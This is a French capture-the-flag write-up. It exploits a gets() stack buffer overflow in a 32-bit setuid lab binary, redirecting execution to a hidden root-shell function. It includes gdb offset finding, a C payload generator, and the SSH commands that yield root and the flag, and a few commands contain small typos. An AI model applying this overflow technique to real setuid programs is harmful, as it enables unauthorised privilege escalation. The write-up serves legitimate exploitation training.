# Challenge Pwn3 Cybernight write up

## Description du challenge
Si vous avez lu les chall précédant, vous avez l'habitude maintenant, un identifiant pour se connecter via SSH nous est fourni:
```bash
ssh ctf@10.242.0.1 -p 2227
passwd: ***
```
Et on retrouve les fichiers suivant:
- *madness*: ELF Executable 32bit, not stripped
- *madness.c*: Code source de *madness* (il s'avère que les admin ont oublié d'enlever le droit de lecture pour ce chall) 
- *flag.txt*: Fichier contenant le flag sans droit de lecture (obviously)

## Analyse du code source

La première reaction quand on ouvre le code source ![Alt](https://openseauserdata.com/files/08eda6a483276d0eff363de8da6ea23a.jpg =50x50)
```c
int BIGFvBgYnMlYOKia(int ANzzGdmd) {
    int X = 119;
    int k = 2273;
    int b = 5280;
    int i = 7452;
    int v = 8805;
    int W = 4789;
    return X+k-b-i-v+W+ANzzGdmd;
}


int AdMbWtzSbOkVliGR(int pHlzcMIH) {
    int g = 5035;
    int M = 9549;
    int O = 8773;
    int R = 3117;
    int f = 6268;
    int z = 3118;
    return BIGFvBgYnMlYOKia(g-M+O-R+f-z-pHlzcMIH);
}
// [...]
```
On a affaire à un code obfusqué, mais comme on a le source code (dommage), une simple recherche dans le texte comme "system" ou "getuid" nous ramène directement à la fonction qui nous donnera le flag

```bash
faco@archad $ cat madness.c | grep -C 3 system
void SpYhDmDKENhhkOlH() {
    setreuid(geteuid(), geteuid());
    system("/bin/bash");
}

int QSLsmaeRXqktRDtj(int xfYiFvSU) {
```
On devine donc rapidement que le chall sera de détourner l’exécution du programme vers cette fonction.

On a notre objectif, maintenant il nous faut un vecteur.
Cherchons une entrée/interaction utilisateur.
Par chance, à la fin du fichier se trouve notre fonction ``main`` et on peut voir qu'elle appelle la function ``bMTsWWvxFNorimkF``:
```c
void bMTsWWvxFNorimkF() {
    char number[11] = {0};

    printf("CHOOSE A NUMBER : ");
    gets(number);
    printf("%d", CjBOSteMrExFSNCq(atoi(number)));
}

int main() {
    bMTsWWvxFNorimkF();
    return 0;
}
```
Le vecteur est vite trouvé, on a un buffer de taille 11 qui est rempli par la fonction ``gets`` qui ne vérifie pas la taille de l'entrée utilisateur par rapport à la taille du buffer dans lequel elle écrit.

## Exploitation

Comme il a été vu précédement, notre objectif est de faire sauter l'execution du programme vers la fonction ```SpYhDmDKENhhkOlH```.
La méthode est la même que pour le chall 2:
- Récuperer l'adresse de la fonction cible
- Déterminer le padding, ici on veut que notre payload modifie l'adresse de retour de fonction (toujours **[EBP+4]** dans la stack)
- Assembler padding et payload, en l'occurence l'adresse de la fonction cible

### Récupérer l'adresse de la fonction cible

Pour récupérer l'adresse de votre fonction, j'utilise ``objdump -t`` pipé dans ``grep`` pour chercher au seins de la liste des symboles de l’exécutable
 ```bash
 faco@archad $ objdump -t ./madness | grep SpYhDmDKENhhkOlH
 0804978b g     F .text  00000047              SpYhDmDKENhhkOlH
 ```
 Et voilà on a notre adresse : *0x0804978b*
 
### Déterminer le padding

J'ouvre le programme *madness* dans gdb et je commence par désassembler la fonction ``bMTsWWvxFNorimkF`` qui utilise ``gets``.
```
(gdb) disassemble bMTsWWvxFNorimkF
   0x08049fe0 <+0>:	endbr32 
   0x08049fe4 <+4>:	push   %ebp
   0x08049fe5 <+5>:	mov    %esp,%ebp
   0x08049fe7 <+7>:	push   %ebx
   0x08049fe8 <+8>:	sub    $0x14,%esp
   0x08049feb <+11>:	call   0x8049170 <__x86.get_pc_thunk.bx>
   0x08049ff0 <+16>:	add    $0x3010,%ebx
   0x08049ff6 <+22>:	movl   $0x0,-0x13(%ebp)
   0x08049ffd <+29>:	movl   $0x0,-0xf(%ebp)
   0x0804a004 <+36>:	movw   $0x0,-0xb(%ebp)
   0x0804a00a <+42>:	movb   $0x0,-0x9(%ebp)
   0x0804a00e <+46>:	sub    $0xc,%esp
   0x0804a011 <+49>:	lea    -0x1fee(%ebx),%eax
   0x0804a017 <+55>:	push   %eax
   0x0804a018 <+56>:	call   0x80490b0 <printf@plt>
   0x0804a01d <+61>:	add    $0x10,%esp
   0x0804a020 <+64>:	sub    $0xc,%esp
   0x0804a023 <+67>:	lea    -0x13(%ebp),%eax
   0x0804a026 <+70>:	push   %eax
   0x0804a027 <+71>:	call   0x80490c0 <gets@plt>
   [...]
   ```
   On place un breakpoint sur ``*bMTsWWvxFNorimkF+71`` (*0x0804a027*). 
   Le breakpoint nous permettera d'avoir la stack juste avant l'overflow, ainsi on pourra déterminer la taille de notre padding afin d'atteindre l'offset **[EBP+4]**.

Une fois le programme lancé on hit directement le breakpoint avant l'execution de ``gets``.
J'affiche 20 WORD en hexadécimale depuis $ESP (le haut de la stack)
```
Breakpoint 1, 0x0804a027 in bMTsWWvxFNorimkF ()
(gdb) x/20wx $esp
0xffffd080:	0xffffd095	0x00000000	0x00000000	0x08049ff0
0xffffd090:	0xffffffff	0x000000f4	0x00000000	0x00000000
0xffffd0a0:	0x00000000	0xf7e1fe34	0xffffd0b8	0x0804a07c
0xffffd0b0:	0x00000000	0x00000000	0x00000000	0xf7c1f119
0xffffd0c0:	0x00000001	0xffffd174	0xffffd17c	0xffffd0e0
```
Une technique pour gagner du temps et avoir facilement le bon offset: (*cf. cyclic_gen() de pwntools*)
```bash
faco@archad $ python -c "print('A' * 11 + 'BBBBCCCCDDDDEEEEFFFF') > cycle
faco@archad $ gdb ./madness
(gdb) r < cycle
[...]
Program received signal SIGSEGV, Segmentation fault.
0x45454545 in ?? ()
```
0x45 correspond à la lettre 'E', donc sur notre chaîne de character, les 4 'E' ont bien recouvert [EBP+4] et EIP a tenté d’exécuter l'instruction à l'adresse 0x45454545 après la fin de la fonction.
Il ne reste plus qu'à remplacer 'EEEE' par notre payload.

PADDING = 11 + 4 * 3 = 23

### Écriture de l'exploit

```c
#define PADDING 23
#define CHAR 0x41
#define PAYLOAD "\x8b\x97\x04\x08"
#define PAYLOAD_LEN 4
```
```c
char* buf = (char*)malloc(PADDING+PAYLOAD_LEN);
memset(buf, CHAR, PADDING);
memcpy(buf+PADDING, PAYLOAD, PAYLOAD_LEN);
```
On écrit buf dans un fichier avec fwrite
```c
fwrite(buf, 1, PADDING+PAYLOAD_LEN, f);
```
Il ne reste plus qu'à compiler et générer notre exploit.
```bash
faco@archad $ gcc exploit.c -o genexploit; ./genexploit
Exploit written at evil
```

### Exploitation
**IMPORTANT**: pour pouvoir profiter du */bin/bash*, il faut également """rediriger un autre stdin""" vers le child créé par ``sytem('/bin/bash ...')``. 
Pour pouvoir envoyer des commandes au shell:
```bash
faco@archad $ (cat evil; cat) | ./madness

whoami
faco
```
Il ne reste plus qu'à tester via ssh

```bash
faco@archad $ (cat evil; evil) | ssh ctf@10.242.0.1 -p 2227 'bash -c ~/madness '
CHOOSE A NUMBER: 

whoami
root
cat ./flag.txt
{FLAG}
``` 




 

